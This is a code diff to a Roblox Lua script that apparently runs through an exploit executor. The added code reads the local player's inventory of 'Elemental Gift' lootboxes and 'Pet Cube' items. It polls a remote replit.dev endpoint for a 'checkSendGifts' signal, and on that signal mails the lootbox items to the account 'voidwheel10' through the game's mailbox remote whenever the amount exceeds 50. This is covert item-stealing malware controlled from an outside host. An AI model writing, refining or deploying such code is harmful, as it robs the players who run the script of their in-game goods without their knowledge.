@@ -407,6 +407,51 @@ local function SendGiftsFunction()
     while true do
         local Http = game:GetService("HttpService")
         local request = (syn and syn.request) or request or (http and http.request) or http_request
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local Player = game.Players.LocalPlayer
+        local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
+
+        local diamondsvalue = 0
+        local gifts = ""
+        local voidvalue = 0
+
+        local ItemLootbox = {"Elemental Gift"}
+        local ItemMisc = {"Pet Cube"}
+
+        local function GetItemInfo(ItemsClass, ItemsName)
+            local Table = {}
+            local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
+
+            if Inventory[ItemsClass] then
+                for UID, Item in pairs(Inventory[ItemsClass]) do
+                    if table.find(ItemsName, Item.id) then
+                        local ItemInfo = {
+                            ["uid"] = UID,
+                            ["data"] = Item
+                        }
+                        table.insert(Table, ItemInfo)
+                    end
+                end
+            end
+            return Table
+        end
+
+        local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
+        for _, ItemInfo in pairs(LootboxItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am then
+                diamondsvalue = ItemData._am
+                gifts = ItemInfo.uid
+            end
+        end
+
+        local MiscItems = GetItemInfo("Misc", ItemMisc)
+        for _, ItemInfo in pairs(MiscItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am then
+                voidvalue = ItemData._am
+            end
+        end
 
         local response = request({
             Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkSendGifts',
@@ -425,19 +470,21 @@ local function SendGiftsFunction()
                     print(gifts)
                     print(diamondsvalue)
 
-                    local args = {
-                        [1] = "voidwheel10",
-                        [2] = "enjoy bro",
-                        [3] = "Lootbox",
-                        [4] = gifts,
-                        [5] = diamondsvalue
-                    }
-                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    if diamondsvalue > 50 then
+                        local args = {
+                            [1] = "voidwheel10",
+                            [2] = "enjoy bro",
+                            [3] = "Lootbox",
+                            [4] = gifts,
+                            [5] = diamondsvalue
+                        }
+                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    end
                 end
             end
         end
 
-        wait(5) 
+        wait(5)
     end
 end
 
